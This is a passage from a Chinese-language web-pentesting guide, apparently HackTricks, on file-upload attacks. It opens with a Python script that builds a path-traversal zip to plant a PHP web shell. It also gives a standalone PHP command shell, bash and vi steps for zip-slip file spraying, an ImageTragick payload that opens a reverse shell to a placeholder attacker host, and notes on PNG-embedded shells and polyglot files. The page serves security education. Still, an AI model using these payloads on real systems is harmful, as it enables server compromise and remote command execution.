def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '&lt;?php echo system($_REQUEST["cmd"]); ?&gt;')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
</code></pre>
<p><strong>利用压缩进行文件喷洒</strong></p>
<p>有关更多详细信息，请<strong>查看原始帖子</strong>： <a href="https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/">https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/</a></p>
<ol>
<li><strong>创建 PHP Shell</strong>：编写 PHP 代码以执行通过 <code>$_REQUEST</code> 变量传递的命令。</li>
</ol>
<pre><code class="language-php">&lt;?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?&gt;
</code></pre>
<ol start="2">
<li><strong>文件喷洒和压缩文件创建</strong>：创建多个文件，并组装一个包含这些文件的 zip 存档。</li>
</ol>
<pre><code class="language-bash">root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
</code></pre>
<ol start="3">
<li><strong>使用十六进制编辑器或 vi 进行修改</strong>：使用 vi 或十六进制编辑器更改 zip 内部文件的名称，将 "xxA" 更改为 "../" 以遍历目录。</li>
</ol>
<pre><code class="language-bash">:set modifiable
:%s/xxA/..\//g
:x!
</code></pre>
<h2 id="imagetragic"><a class="header" href="#imagetragic">ImageTragic</a></h2>
<p>将此内容与图像扩展名一起上传以利用该漏洞 <strong>(ImageMagick , 7.0.1-1)</strong> （来自 <a href="https://www.exploit-db.com/exploits/39767">exploit</a>）</p>
<pre><code>push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i &gt;&amp; /dev/tcp/attacker-ip/attacker-port 0&gt;&amp;1|touch "hello)'
pop graphic-context
</code></pre>
<h2 id="在png中嵌入php-shell"><a class="header" href="#在png中嵌入php-shell">在PNG中嵌入PHP Shell</a></h2>
<p>在PNG文件的IDAT块中嵌入PHP shell可以有效绕过某些图像处理操作。PHP-GD中的<code>imagecopyresized</code>和<code>imagecopyresampled</code>函数在此上下文中特别相关，因为它们通常用于调整和重采样图像。嵌入的PHP shell能够不受这些操作影响，这对某些用例来说是一个显著的优势。</p>
<p>以下文章提供了对该技术的详细探索，包括其方法论和潜在应用：<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">"在PNG IDAT块中编码Web Shell"</a>。该资源提供了对该过程及其影响的全面理解。</p>
<p>更多信息请见：<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
<h2 id="多格式文件"><a class="header" href="#多格式文件">多格式文件</a></h2>
<p>多格式文件在网络安全中作为一种独特工具，像变色龙一样可以同时有效存在于多种文件格式中。一个有趣的例子是<a href="https://en.wikipedia.org/wiki/Gifar">GIFAR</a>，它既可以作为GIF文件，也可以作为RAR归档文件。这类文件并不限于这种组合；像GIF和JS或PPT和JS的组合也是可行的。</p>
<p>多格式文件的核心实用性在于它们能够绕过基于类型筛选文件的安全措施。各种应用中的常见做法是仅允许某些文件类型上传——如JPEG、GIF或DOC——以降低潜在有害格式（例如JS、PHP或Phar文件）带来的风险。然而，多格式文件通过符合多种文件类型的结构标准，可以悄然绕过这些限制。</p>
<p>尽管它们具有适应性，但多格式文件确实面临限制。例如，虽然一个多格式文件可能同时包含一个PHAR文件（PHp ARchive）和一个JPEG，但其上传的成功可能取决于平台的文件扩展名政策。如果系统对允许的扩展名要求严格，仅仅是多格式文件的结构双重性可能不足以保证其上传。</p>
<p>更多信息请见：<a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files</a></li>
<li><a href="https://github.com/modzero/mod0BurpUploadScanner">https://github.com/modzero/mod0BurpUploadScanner</a></li>
<li><a href="https://github.com/almandin/fuxploider">https://github.com/almandin/fuxploider</a></li>
<li><a href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html">https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html</a></li>
<li><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></li>
<li><a href="https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a">https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a</a></li>
</ul>
<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
<p>如果你对<strong>黑客职业</strong>感兴趣并想要攻克不可攻克的目标 - <strong>我们正在招聘！</strong> (<em>需要流利的波兰语书写和口语能力</em>).</p>
<p>{% embed url="https://www.stmcyber.com/careers" %}</p>
<p>{% hint style="success" %}
学习和实践AWS黑客技术：<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家（ARTE）</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客技术：<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家（GRTE）</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在</strong> <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>上关注我们。</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub库提交PR分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
